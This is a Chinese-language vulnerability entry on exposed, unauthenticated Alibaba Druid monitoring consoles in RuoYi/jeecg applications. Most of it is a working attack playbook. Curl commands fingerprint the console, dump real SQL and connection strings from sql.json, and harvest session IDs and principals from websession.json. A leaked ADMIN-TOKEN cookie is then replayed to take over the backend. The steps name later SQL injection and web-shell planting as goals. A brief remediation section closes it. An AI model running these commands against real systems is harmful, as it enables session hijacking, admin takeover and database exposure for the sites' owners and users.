---
title: Druid 监控未授权 → session 泄露/后台接管（若依系必备）
cve: 无（配置缺陷）
severity: critical
cvss: 9.0
product: Alibaba Druid 连接池监控（若依/jeecg 等）
versions: 任意
ports: 80, 443, 8080
keywords: druid, 监控, session, 未授权, 若依, jeecg
entry: /druid/index.html  /druid/websession.html
verified: false
sources: 公开资料整理（配置缺陷类）
---

## 指纹

```
GET /druid/index.html        → 200（Druid 控制台）
GET /druid/websession.html   → 会话列表
GET /prod-api/druid/index.html → 网关后也能到
```

## 前置条件

- Druid StatViewServlet 暴露且未设账号（或弱口令）。

## PoC

```bash
# 1) 进控制台
curl -s -o /dev/null -w '%{http_code}\n' 'https://target/druid/index.html'

# 2) 拉 SQL 监控（含真实 SQL 与库连接串）
curl -s 'https://target/druid/sql.json' | head -c 300

# 3) 拉 Web 会话（会话 id + 用户）
curl -s 'https://target/druid/websession.json' | head -c 500
# 判定：返回 sessionId/principal = 可拿管理员会话
```

```bash
# 4) 用泄露的 session 直接访问后台
curl -s 'https://target/api/user/info' -H 'Cookie: ADMIN-TOKEN=<泄露值>' | head -c 200
```

## 利用步骤

1. 先判 `index.html` 200；
2. 读 `websession.json` 拿管理员会话（比爆破快）；
3. 用该 Cookie 调后台接口验证；
4. 同时读 `sql.json` 拿库结构，为 SQL 注入/写马铺路；
5. 证据：websession 的 principal（打码）+ 后台接口 200。

## 修复与缓解

- 关掉 StatViewServlet 或加账号 + IP 白名单；`druid.stat-view-servlet.enabled=false`；
- 网关层拦 `/druid/*`。

## 参考

- Druid 官方配置文档；若依安全加固说明。
